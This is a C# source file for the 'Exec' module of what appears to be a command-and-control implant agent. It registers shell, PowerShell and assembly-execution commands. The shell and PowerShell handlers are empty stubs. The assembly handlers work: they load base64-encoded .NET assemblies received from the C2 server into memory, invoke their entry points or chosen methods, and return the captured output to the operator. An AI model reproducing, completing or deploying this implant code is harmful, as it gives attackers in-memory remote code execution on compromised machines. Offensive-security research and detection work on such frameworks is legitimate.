using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;

namespace Agent.Modules
{
    public class ExecModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        Assembly CurrentAssembly;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Exec",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "Shell",
                        Delegate = ExecuteShellCommand
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Run",
                        Delegate = ExecuteRunCommand
                    },
                    new ModuleInfo.Command
                    {
                        Name = "PowerShell",
                        Delegate = ExecutePowerShellCommand
                    },
                    new ModuleInfo.Command
                    {
                        Name = "PowerPick",
                        Delegate = ExecutePowerPickCommand
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Assembly",
                        Delegate = ExecuteAssembly
                    },
                    new ModuleInfo.Command
                    {
                        Name = "ImportAssembly",
                        Delegate = ImportAssembly
                    },
                    new ModuleInfo.Command
                    {
                        Name = "AssemblyMethod",
                        Delegate = ExecuteAssemblyMethod
                    }
                }
            };
        }

        void ExecuteShellCommand(string AgentID, C2Data C2Data)
        {
            try
            {
                
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ExecuteRunCommand(string AgentID, C2Data C2Data)
        {
            try
            {

            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ExecutePowerShellCommand(string AgentID, C2Data C2Data)
        {
            try
            {

            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ExecutePowerPickCommand(string AgentID, C2Data C2Data)
        {
            try
            {

            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ExecuteAssembly(string AgentID, C2Data C2Data)
        {
            var stdout = Console.Out;
            var stderr = Console.Error;

            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;

                var arguments = parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
                var asmBytes = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Assembly", StringComparison.OrdinalIgnoreCase)).Value);

                var outWrite = new StringWriter();
                var errWrite = new StringWriter();

                Console.SetOut(outWrite);
                Console.SetError(errWrite);

                var asm = Assembly.Load(asmBytes);

                if (arguments == null)
                {
                    arguments = new string[] { };
                }
                else
                {
                    arguments = ((string)arguments).Split(' ');
                }

                asm.EntryPoint.Invoke(null, new object[] { arguments });

                Console.Out.Flush();
                Console.Error.Flush();

                var result = new StringBuilder();
                result.Append(outWrite.ToString());
                result.Append(errWrite.ToString());

                Agent.SendMessage(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
            finally
            {
                Console.SetOut(stdout);
                Console.SetError(stderr);
            }
        }

        void ImportAssembly(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
                var asmBytes = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Assembly", StringComparison.OrdinalIgnoreCase)).Value);

                CurrentAssembly = Assembly.Load(asmBytes);

                Agent.SendMessage($"Assembly loaded: {CurrentAssembly.FullName}");
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
            
        }

        void ExecuteAssemblyMethod(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;

                var type = (string)parameters.FirstOrDefault(p => p.Name.Equals("Type", StringComparison.OrdinalIgnoreCase)).Value;
                var method = (string)parameters.FirstOrDefault(p => p.Name.Equals("Method", StringComparison.OrdinalIgnoreCase)).Value;
                var arguments = parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;

                var t = CurrentAssembly.GetType(type);

                if (t == null)
                {
                    Agent.SendError("Could not find specified type");
                    return;
                }

                var m = t.GetMethod(method);

                if (m == null)
                {
                    Agent.SendError("Could not find specified method");
                    return;
                }

                string result;

                if (arguments == null)
                {
                    result = (string)m.Invoke(null, new object[] { });
                }
                else
                {
                    result = (string)m.Invoke(null, new object[] { (string)arguments });
                }

                Agent.SendMessage(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }
    }
}